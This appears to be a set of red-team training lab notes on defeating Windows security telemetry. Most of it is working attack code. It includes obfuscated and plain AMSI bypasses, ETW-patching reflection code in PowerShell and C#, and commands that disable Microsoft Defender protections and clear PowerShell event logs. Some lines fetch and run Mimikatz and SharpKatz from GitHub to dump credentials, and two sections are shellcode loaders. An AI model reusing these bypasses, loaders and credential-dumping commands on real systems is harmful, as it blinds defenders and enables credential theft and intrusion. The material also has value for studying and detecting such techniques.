<p>We have now collected ETW Telemetry on powershell, we could ship this of to an Elastic stack, but for now let's just convert the trace file to an EVTX log that we can view with Windows Eventviewer.</p>
<pre><code class="language-powershell">tracerpt PowerShellTrace.etl -o PowershellTrace.evtx -of evtx -lr
</code></pre>
<p><img src="./images/etw_logmantrace1.jpg" alt="Screenshot" /></p>
<p>Now open Windows Eventviewer and load the saved log by going to <code>ACTION</code> and then <code>SAVED LOG</code>, browse to your PowerShellTrace.evtx file and click <code>OK</code>.:</p>
<p><img src="./images/etw_evt1.jpg" alt="Screenshot" /></p>
<p>We see a whole bunch of logs here, but let's see if we can find the commands we typed ($pid and get-process), by filtering for event ID 4104</p>
<p><img src="./images/etw_evt2.jpg" alt="Screenshot" /></p>
<p>Click on <code>Filter Current Log</code> in the right pane of eventviewer and enter `4104</p>
<p><img src="./images/etw_evt4104.jpg" alt="Screenshot" /></p>
<p>And yes we can find both commands:</p>
<p><img src="./images/etw_evtpid.jpg" alt="Screenshot" /></p>
<p><img src="./images/etw_evtgetproc.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#mini-lab---bypassing-etw-in-powershell" id="mini-lab---bypassing-etw-in-powershell">MINI LAB - BYPASSING ETW in Powershell</a></h1>
<p>run after amsi bypass:</p>
<pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
</code></pre>
<p>then run</p>
<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
</code></pre>
<p>No detections, AMSI is disabled, ETW is disabled -&gt; Check eventviewer -&gt; no powershell logs.</p>
<h2><a class="header" href="#understanding-the-components" id="understanding-the-components">Understanding the Components:</a></h2>
<ul>
<li><strong><code>[Reflection.Assembly]::LoadWithPartialName('System.Core')</code>:</strong>
<ul>
<li>Loads the <code>System.Core.dll</code> assembly, containing core .NET classes, including <code>System.Diagnostics.Eventing.EventProvider</code>.</li>
</ul>
</li>
<li><strong><code>.GetType('System.Diagnostics.Eventing.EventProvider')</code>:</strong>
<ul>
<li>Retrieves the <code>System.Diagnostics.Eventing.EventProvider</code> type, responsible for emitting ETW events.</li>
</ul>
</li>
<li><strong><code>.GetField('m_enabled','NonPublic,Instance')</code>:</strong>
<ul>
<li>Retrieves the <code>m_enabled</code> field of the <code>EventProvider</code> class, a non-public instance field that determines whether ETW events are enabled.</li>
</ul>
</li>
<li><strong><code>.SetValue(...)</code>:</strong>
<ul>
<li>Sets the value of the <code>m_enabled</code> field.</li>
</ul>
</li>
<li><strong><code>[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')</code>:</strong>
<ul>
<li>Retrieves the <code>System.Management.Automation.Tracing.PSEtwLogProvider</code> type, a PowerShell-specific wrapper around the .NET ETW functionality.</li>
</ul>
</li>
<li><strong><code>.GetField('etwProvider','NonPublic,Static').GetValue($null)</code>:</strong>
<ul>
<li>Retrieves the <code>etwProvider</code> field of the <code>PSEtwLogProvider</code> class, a non-public static field holding a reference to the <code>EventProvider</code> instance used by PowerShell.</li>
</ul>
</li>
<li><strong><code>,0</code>:</strong>
<ul>
<li>Sets the <code>m_enabled</code> field to <code>0</code> (false), disabling ETW events for the PowerShell <code>EventProvider</code>.</li>
</ul>
</li>
</ul>
<h2><a class="header" href="#how-it-works-etw-bypass" id="how-it-works-etw-bypass">How It Works (ETW Bypass):</a></h2>
<ul>
<li>PowerShell uses the .NET <code>EventProvider</code> class to generate ETW events.</li>
<li>The <code>PSEtwLogProvider</code> class in PowerShell acts as a bridge, holding the specific <code>EventProvider</code> instance used for PowerShell logging.</li>
<li>The <code>m_enabled</code> field within the <code>EventProvider</code> class controls whether events are actually emitted.</li>
<li>By using reflection, the code directly accesses and modifies this internal <code>m_enabled</code> field, setting it to <code>0</code>.</li>
<li>This prevents the PowerShell <code>EventProvider</code> from generating ETW events, effectively bypassing ETW logging for that PowerShell process.</li>
</ul>
<p><img src="./images/etw_diag.jpg" alt="Screenshot" /></p>
<h2><a class="header" href="#key-points" id="key-points">Key Points:</a></h2>
<ul>
<li>This method relies on internal .NET implementation details and might break if those details change in future .NET or PowerShell versions.</li>
<li>It only affects the current PowerShell process.</li>
<li>It is very effective at disabling the ETW logging from within powershell.</li>
<li>This technique is commonly used by malicious actors.</li>
<li>EDR solutions monitor for this type of activity.</li>
</ul>
<p>CSHARP CODE (AI Generated) using the same ETW bypass (also works for .net binaries)</p>
<pre><code class="language-CSharp">using System;
using System.Diagnostics.Eventing;
using System.Reflection;

public class EtwBypass
{
    public static void Main(string[] args)
    {
        try
        {
            // Get the EventProvider type
            Type eventProviderType = typeof(EventProvider);

            // Find the m_enabled field (non-public, instance)
            FieldInfo mEnabledField = eventProviderType.GetField(&quot;m_enabled&quot;, BindingFlags.NonPublic | BindingFlags.Instance);

            // Get the EventProvider instance used by the application (you'll need to adapt this part)
            // This is the tricky part, as you need to find the specific instance you want to patch.
            // In a real application, you would need to find the event provider instance that is used.
            // This example creates a new instance just for demonstration.
            EventProvider dummyProvider = new EventProvider(Guid.NewGuid());

            // Set the m_enabled field to 0 (false)
            if (mEnabledField != null)
            {
                mEnabledField.SetValue(dummyProvider, 0);
                Console.WriteLine(&quot;ETW bypassed.&quot;);
            }
            else
            {
                Console.WriteLine(&quot;m_enabled field not found.&quot;);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
        }
    }
}
</code></pre>
<h2><a class="header" href="#etw-patching-in-net-binaries-vs-powershell" id="etw-patching-in-net-binaries-vs-powershell">ETW Patching in .NET Binaries vs. PowerShell</a></h2>
<p><strong>PowerShell Patch:</strong></p>
<ul>
<li>Uses reflection to modify the <code>PSEtwLogProvider</code> within the PowerShell process.</li>
<li>Specifically targets how PowerShell logs events.</li>
<li>Limited to the PowerShell process.</li>
<li>Executed as a PowerShell command.</li>
<li>Targets the PowerShell ETW logging mechanism.</li>
</ul>
<p><strong>.NET Binary Patch (C# Example):</strong></p>
<ul>
<li>Compiles into a standalone .NET executable.</li>
<li>Uses reflection to directly modify the <code>EventProvider</code> class within the running .NET binary.</li>
<li>Can patch ETW logging for any .NET application that uses the standard .NET <code>EventProvider</code> class, if the correct <code>EventProvider</code> instance can be located.</li>
<li>Can affect any .NET application.</li>
<li>Executed as a compiled executable.</li>
<li>Targets the <code>EventProvider</code> class, allowing it to target any .NET application using that class.</li>
</ul>
<p><strong>Key Differences and Implications:</strong></p>
<ul>
<li><strong>Scope:</strong>
<ul>
<li>PowerShell patch: Limited to the PowerShell process.</li>
<li>.NET binary patch: Can affect any .NET application, if the correct event provider can be located.</li>
</ul>
</li>
<li><strong>Execution Context:</strong>
<ul>
<li>PowerShell patch: Executed as a PowerShell command.</li>
<li>.NET binary patch: Executed as a compiled executable.</li>
</ul>
</li>
<li><strong>Targeting:</strong>
<ul>
<li>Powershell patch: Targets the powershell ETW logging.</li>
<li>.net binary patch: Targets the event provider class, so it can target any .net application that uses that class.</li>
</ul>
</li>
</ul>
<p><strong>In summary:</strong> The C# code provides a more general-purpose ETW patching mechanism that can be used independently of PowerShell, while the PowerShell one-liner is specific to the PowerShell environment.</p>
<hr />
<h1><a class="header" href="#telemetrysourceror" id="telemetrysourceror">TelemetrySourceror</a></h1>
<p>Make sure secure boot is disabled in VM</p>
<pre><code class="language-powershell">bcdedit.exe -set TESTSIGNING ON
</code></pre>
<p>Reboot the machine</p>
<p>Use PSEXEC to run as system and run Telemetry Sourceror</p>
<hr />
<p>ETW USER LAND vs KERNEL MODE</p>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<h1><a class="header" href="#powershell-lab---bypassing-amsi-and-etw" id="powershell-lab---bypassing-amsi-and-etw">Powershell Lab - Bypassing AMSI and ETW</a></h1>
<blockquote>
<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
<strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
</blockquote>
<blockquote>
<p><em><strong>ENABLE POWERSHELL LOGGING</strong></em> : For this lab and all future labs, turn on powershell logging on your windows machine.</p>
</blockquote>
<p><img src="./images/ps_gpol.jpg" alt="image" /></p>
<p>Go to Local Computer Policy - Computer Configuration - Administrative Templates - Windows Components.</p>
<p><img src="./images/ps_gpol1.jpg" alt="image" /></p>
<p>Scroll down to Microsoft Powershell and enable <code>MODULE LOGGING</code> and <code>SCRIPT BLOCK LOGGING</code>.</p>
<p><img src="./images/ps_gpol2.jpg" alt="image" /></p>
<p>This will log any powershell commands and script contents run in a powershell console - using eventviewer we can have a look for Event ID 800, 4103 and 4104. Open Eventviewer and go to <code>Applications and Services Logs</code> - <code>MICROSOFT</code> - <code>POWERSHELL</code> - <code>OPERATIONAL</code>.</p>
<p><img src="./images/ps_evt.jpg" alt="image" /></p>
<p><img src="./images/ps_evt1.jpg" alt="image" /></p>
<p>Make exceptions in Windows Defender:</p>
<pre><code class="language-bash">[+] C:\Downloads -&gt; to make it easier to download our tools with out AV Detection
[+] C:\THEV -&gt; our training course
[+] C:\Temp -&gt; Used by GoCheck
[+] C:\SysinternalsSuite
</code></pre>
<p>We can do this using powershell:</p>
<pre><code class="language-powershell">Add-MpPreference -ExclusionPath &quot;C:\SysinternalsSuite&quot;
(Get-MpPreference).ExclusionPath
</code></pre>
<p>We can check some general Defender settings in powershell:</p>
<pre><code class="language-powershell">Get-MpComputerStatus
Get-MpThreat
</code></pre>
<p>Turning off various modules of Microsoft Defender using powershell:</p>
<h3><a class="header" href="#real-time-protection" id="real-time-protection">Real-Time Protection</a></h3>
<p><code>Real-Time Protection</code>: This is a feature of Microsoft Defender that continuously monitors your system for threats (e.g., malware, viruses) in real-time. It scans files, apps, and processes as they are accessed or executed. Setting DisableRealtimeMonitoring to $true turns off real-time protection, meaning files and processes are no longer automatically scanned.</p>
<p>This does not disable Microsoft Defender entirely — it only disables real-time scanning. Other features like <em><strong>scheduled scans and manual scans will still work</strong></em>.</p>
<pre><code class="language-powershell">Set-MpPreference -DisableRealtimeMonitoring $true
</code></pre>
<h3><a class="header" href="#cloud-delivered-protection" id="cloud-delivered-protection">Cloud-Delivered Protection</a></h3>
<p>The <code>MAPSReporting</code> setting controls the Microsoft Active Protection Service (MAPS), also referred to as <code>Cloud-Delivered Protection</code>. Setting it to Disabled stops your system from sending information about threats to Microsoft and prevents it from receiving <code>cloud-based threat intelligence</code> in real time.</p>
<pre><code class="language-powershell">Set-MpPreference -MAPSReporting Disable
</code></pre>
<h3><a class="header" href="#automatic-sample-submission" id="automatic-sample-submission">Automatic Sample Submission</a></h3>
<p><code>SubmitSamplesConsent</code> controls how Microsoft Defender submits samples of suspicious or potentially harmful files to Microsoft for analysis. These samples help improve Defender’s detection and protection capabilities.</p>
<p><code>NeverSend</code>: This value tells Microsoft Defender to disable all sample submissions. No files will be sent to Microsoft for further analysis, even if they’re flagged as suspicious.</p>
<pre><code class="language-powershell">Set-MpPreference -SubmitSamplesConsent NeverSend
</code></pre>
<table><thead><tr><th>Consent Level</th><th>Description</th></tr></thead><tbody>
<tr><td>0</td><td>Always Prompt</td></tr>
<tr><td>1</td><td>Send Safe Samples Automatically</td></tr>
<tr><td>2</td><td>Never Send</td></tr>
</tbody></table>
<h3><a class="header" href="#periodic-scanning" id="periodic-scanning">Periodic Scanning</a></h3>
<p>The <code>DisableScanningNetworkFiles</code> setting in Microsoft Defender controls whether network files are scanned. When you set DisableScanningNetworkFiles to $true, it disables the scanning of files located on network drives</p>
<pre><code class="language-Powershell">Set-MpPreference -DisableScanningNetworkFiles $true
</code></pre>
<h1><a class="header" href="#lab---evading-amsi" id="lab---evading-amsi">LAB - Evading AMSI</a></h1>
<blockquote>
<p>For this lab we will enable <code>Microsoft Defender</code> - in order to demonstrate how AMSI works, and how to bypass it.</p>
</blockquote>
<p>Check if Defender is turned on by either pasting the powershell commands below, or by running the checkav.ps1 script:</p>
<p>Open a powershell prompt:</p>
<pre><code class="language-powershell">cd \thev\labs\powershell
.\checkav.ps1
</code></pre>
<p>The script contains the following code:</p>
<pre><code class="language-powershell">[PSCustomObject]@{
    &quot;Real-Time Protection&quot;        = if ((Get-MpComputerStatus).RealTimeProtectionEnabled -eq $false) {&quot;disabled&quot;} else {&quot;enabled&quot;}
    &quot;Cloud-Delivered Protection&quot;  = if ((Get-MpPreference).MAPSReporting -eq 0) { &quot;disabled&quot; } else { &quot;enabled&quot; }
    &quot;Automatic Sample Submission&quot; = if ((Get-MpPreference).SubmitSamplesConsent -eq 2) { &quot;disabled&quot; } else { &quot;enabled&quot; }
    &quot;Periodic File Scanning&quot;      = if ((Get-MpPreference).DisableScanningNetworkFiles -eq $true) {&quot;disabled&quot;} else {&quot;enabled&quot;}
} | Format-Table -AutoSize
</code></pre>
<p>The output should be like this :</p>
<p><img src="./images/ps_defsettings.jpg" alt="image" /></p>
<blockquote>
<p><strong>IMPORTANT</strong>: Make sure Real-Time Protection is <code>enabled</code> and the rest is <code>disabled</code> - if this is not the case just run the following script, it will configure the right settings.</p>
</blockquote>
<pre><code class="language-powershell">cd \thev\labs\powershell
.\enableav.ps1
</code></pre>
<p>Before we start let's clear the powershell event logs, so there's no noise from before in there. You can do this by opening a powershell console and typing the following command:</p>
<pre><code class="language-powershell">wevtutil cl &quot;Microsoft-Windows-PowerShell/Operational&quot;
</code></pre>
<p>Now from the same powershell terminal, run SharpKatz from memory with IEX (Invoke Expression)</p>
<pre><code class="language-Powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/crimsoncore/Invoke-SharpKatz/refs/heads/main/Invoke-SharpKatz.ps1&quot;);Invoke-SharpKatz
</code></pre>
<p>We'll see the script won't execute since AMSI intercepted it before executing and has sent it to Defender that scanned it and determined it as malicious:</p>
<p><img src="./images/ps_invokesharkpkatzblocked.jpg" alt="image" /></p>
<p>Let's have a look at the EventViewer logs - open EventViewer, select <strong>&quot;Application and Services Logs&quot;</strong>, <strong>&quot;Microsoft&quot;</strong>,<strong>&quot;Windows&quot;</strong>, <strong>&quot;Powershell&quot;</strong> and finally <strong>&quot;Operational&quot;</strong>.</p>
<p><img src="./images/ps_eventvwr.jpg" alt="image" /></p>
<p>OK, so now what?</p>
<p><strong>Bypassing AMSI - How it works</strong></p>
<p>Let's clear the powershell event logs again:</p>
<pre><code class="language-powershell">wevtutil cl &quot;Microsoft-Windows-PowerShell/Operational&quot;
</code></pre>
<p><code>NEW ONE</code>:</p>
<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
</code></pre>
<blockquote>
<p>Invoke-obfuscation
set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
token
string
2</p>
</blockquote>
<p>output =</p>
<pre><code class="language-powershell">[Ref].Assembly.GetType((&quot;{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}&quot;-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField((&quot;{0}{1}{2}&quot; -f 'amsi','InitFa','iled'),(&quot;{1}{0}{4}{2}{3}&quot; -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
</code></pre>
<p>Safe both commands to a file and run gocheck64</p>
<p>And now let's run an obfuscated AMSI Bypass from the same powershell terminal:</p>
<p><code>OLD ONE</code></p>
<pre><code class="language-powershell">sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( &quot;1Q2U&quot;  +&quot;zX&quot;  )  -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f'amsi','d','InitFaile'  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','i','NonPubli','c','c, ' )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
</code></pre>
<p>And let's try that Invoke-SharpKatz again, if all goes well, AMSI should be patched and the script will run:</p>
<p>Success!!!</p>
<blockquote>
<p><em><strong>DETECTIONS</strong></em>
Eventlog 800, 4103, 4104</p>
</blockquote>
<hr />
<p>However bypassing AMSI doesn't disable eventlogs - which are useful telemetry for EDR's, SIEM's and UEBA's. Let's open Eventviewer again and see what was logged.</p>
<p>A very cool Forensics tools that can anaylyze powershell logs is <code>Powershell-Hunter</code> - if we run this on our powershell logs it will also flag some suspicious commands.</p>
<p>Ideally we don't want any of these logs to be generated and thus shutting off the telemety for security solutions, we can do this by patchin ETW (Event Tracing for Windows).</p>
<p>Let's clear the powershell event logs again before we apply the ETW bypass (remember AMSI is already patched so this ETW bypass doesn't need to be obfuscated):</p>
<pre><code class="language-powershell">wevtutil cl &quot;Microsoft-Windows-PowerShell/Operational&quot;
</code></pre>
<p><strong>ETW Bypass</strong></p>
<pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
</code></pre>
<p>In summary, this command does the following:</p>
<blockquote>
<p><strong>[+]</strong> Uses reflection to access internal, non-public fields in .NET classes.</p>
<p><strong>[+]</strong> Targets the etwProvider object within PowerShell’s PSEtwLogProvider class, which handles ETW logging.</p>
<p><strong>[+]</strong> Sets the m_enabled field of the underlying EventProvider to false, disabling ETW event logging for PowerShell activities.</p>
<p><strong>Result</strong>: PowerShell commands, script blocks, and other activities that would normally be logged via ETW (e.g., for security monitoring or auditing) will no longer generate ETW events, making them harder to detect by security tools like Windows Defender, Sysmon, or other EDR solutions that rely on ETW.</p>
</blockquote>
<p>If we want to use this first, without an AMSI Bypass, we'll have to obuscate it, otherwise AMSI will trigger on this code. We'll use <code>Invoke-Obfuscastion</code>.</p>
<pre><code class="language-powershell">cd \thev\invoke-obfuscation
import-module invoke-obfuscation.psd1
invoke obfuscation
</code></pre>
<p><img src="./images/ps_obfuscopen.jpg" alt="image" /></p>
<p>then we'll enter our script into Invoke-Obfuscation.</p>
<pre><code class="language-powershell">SET SCRIPTBLOCK [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
</code></pre>
<p>Next we'll select &quot;token&quot;, &quot;string&quot; and &quot;2&quot;, re-order.</p>
<p>Our output command is now:</p>
<pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName((&quot;{1}{0}{2}&quot; -f 'm.Co','Syste','re')).GetType((&quot;{10}{0}{6}{7}{1}{4}{11}{5}{8}{2}{9}{3}&quot;-f '.D','i','Event','ider','cs','Eventi','iagnos','t','ng.','Prov','System','.')).GetField((&quot;{0}{1}{2}&quot; -f 'm','_e','nabled'),(&quot;{1}{2}{0}{3}{4}&quot;-f 'P','No','n','ublic,I','nstance')).SetValue([Ref].Assembly.GetType((&quot;{5}{7}{6}{4}{0}{9}{8}{2}{11}{10}{3}{1}&quot;-f 'nagement.','er','n','rovid','Ma','Syst','.','em','tomatio','Au','cing.PSEtwLogP','.Tra')).GetField((&quot;{0}{1}{3}{2}&quot;-f'et','wP','vider','ro'),(&quot;{1}{3}{2}{0}&quot;-f'tic','No','ic,Sta','nPubl')).GetValue($null),0)
</code></pre>
<p>With &quot;copy&quot; we can copy it to our clipboard, open a new powershell and past the command. Then check eventviewer!</p>
<p><img src="./images/ps_obfuscate.jpg" alt="image" /></p>
<p>powershell shellcode loader (without amsi bypass)</p>
<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

$code = @&quot;
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport(&quot;msvcrt.dll&quot;, SetLastError=true)] public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
}
&quot;@

Add-Type -TypeDefinition $code

# Allocate memory
$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)

# Copy shellcode to memory
[Win32]::memcpy($mem, $shellcode, $shellcode.Length)

# Create thread to execute shellcode
$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Wait for thread to exit (optional)
[System.Runtime.InteropServices.Marshal]::WaitForSingleObject($thread, 0xFFFFFFFF)
</code></pre>
<p>Shorter version:</p>
<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

# Allocate memory
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)

# Copy shellcode to memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)

# Create thread to execute shellcode
$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])

# Start the thread
$thread.Invoke()

# Wait for thread to exit (optional)
[System.Threading.Thread]::Sleep(-1)
</code></pre>
<h1><a class="header" href="#amsi-and-etw-bypass-in-1" id="amsi-and-etw-bypass-in-1">AMSI and ETW bypass in 1:</a></h1>
<p>https://github.com/BlackShell256/Null-AMSI?tab=readme-ov-file</p>
<pre><code class="language-powershell">iex (iwr -UseBasicParsing https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/Invoke-NullAMSI.ps1);Invoke-NullAmsi -etw -v;IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/crimsoncore/Invoke-SharpKatz/refs/heads/main/Invoke-SharpKatz.ps1&quot;);Invoke-SharpKatz
</code></pre>
<p>Another AMSI Bypass:</p>
<pre><code class="language-powershell">$t=[Ref].Assembly.GetType(('System.Manage'+'ment.Automa'+'tion.AmsiUtils'));
$f=$t.GetField(('amsiIn'+'itFailed'),'NonPublic,Static');
$f.SetValue($null,$true);
</code></pre>
<p><a href="https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c">https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c</a></p>
<p>includes c-code!!!</p>
<h2><a class="header" href="#amsibypass" id="amsibypass">AMSIBYPASS</a></h2>
<blockquote>
<p>This bypass does not require administrator rights!!!</p>
</blockquote>
<p>Works on 1903, 1909 and before</p>
<pre><code class="language-yaml">sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( &quot;1Q2U&quot;  +&quot;zX&quot;  )  -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f'amsi','d','InitFaile'  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','i','NonPubli','c','c, ' )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
</code></pre>
<p>List <code>dirty</code> words: </p>
<pre><code class="language-yaml">[ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
</code></pre>
<hr />
<p>Los er door:</p>
<pre><code class="language-powershell">$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
</code></pre>
<p>https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b</p>
<p>And finally AMSI.FAIL</p>
<p>or this also works</p>
<pre><code class="language-powershell">class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
</code></pre>
<p>then run</p>
<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
</code></pre>
<p><strong>C# Example:</strong></p>
<pre><code class="language-csharp">using System;
using System.Reflection;

public class AmsiBypass
{
    public static void Main(string[] args)
    {
        try
        {
            // Get the AmsiUtils type
            Type amsiUtilsType = typeof(System.Management.Automation.AmsiUtils);

            // Get the amsiInitFailed field
            FieldInfo amsiInitFailedField = amsiUtilsType.GetField(&quot;amsiInitFailed&quot;, BindingFlags.NonPublic | BindingFlags.Static);

            // Set the amsiInitFailed field to true
            if (amsiInitFailedField != null)
            {
                amsiInitFailedField.SetValue(null, true);
                Console.WriteLine(&quot;AMSI bypassed.&quot;);
            }
            else
            {
                Console.WriteLine(&quot;amsiInitFailed field not found.&quot;);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
        }
    }
}
</code></pre>
<h2><a class="header" href="#key-considerations" id="key-considerations">Key Considerations:</a></h2>
<ul>
<li><strong>Assembly Loading:</strong>
<ul>
<li>If your .NET binary doesn't already have <code>System.Management.Automation.dll</code> loaded, you may need to load it explicitly using <code>Assembly.Load()</code> or related methods.</li>
</ul>
</li>
<li><strong>.NET Version Compatibility:</strong>
<ul>
<li>Ensure that the reflection code is compatible with the .NET Framework or .NET Core/.NET 5+ version that the target binary is using.</li>
</ul>
</li>
<li><strong>Security Implications:</strong>
<ul>
<li>AMSI bypass techniques can be used for malicious purposes. Use them responsibly and ethically.</li>
</ul>
</li>
<li><strong>EDR Detection:</strong>
<ul>
<li></li>
</ul>
</li>
<li><strong>Finding the correct assembly:</strong>
<ul>
<li>In some .net applications, the <code>System.Management.Automation.dll</code> may not be loaded. If this is the case, you will need to load it.</li>
</ul>
</li>
</ul>
<p><strong>In summary:</strong> The AMSI bypass technique using reflection is not limited to PowerShell and can be successfully implemented in .NET binaries.</p>
<hr />
<h1><a class="header" href="#dotnet-packing" id="dotnet-packing">dotnet packing</a></h1>
<p>ConfuserEx
Babel</p>
<hr />
<p>https://github.com/pracsec/AmsiScanner/tree/main/src</p>
<p>https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr</p>
<pre><code class="language-powershell">$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiSession&quot;,&quot;NonPublic,Static&quot;).SetValue($null, $null);[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiContext&quot;,&quot;NonPublic,Static&quot;).SetValue($null, [IntPtr]$mem)
</code></pre>
<p>Use this one:</p>
<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
</code></pre>
<blockquote>
<p>Invoke-obfuscation
set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
token
string
2</p>
</blockquote>
<p>output =</p>
<pre><code class="language-powershell">[Ref].Assembly.GetType((&quot;{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}&quot;-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField((&quot;{0}{1}{2}&quot; -f 'amsi','InitFa','iled'),(&quot;{1}{0}{4}{2}{3}&quot; -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
</code></pre>
<h1><a class="header" href="#powershell-in-memory-loader" id="powershell-in-memory-loader">Powershell in-memory loader</a></h1>
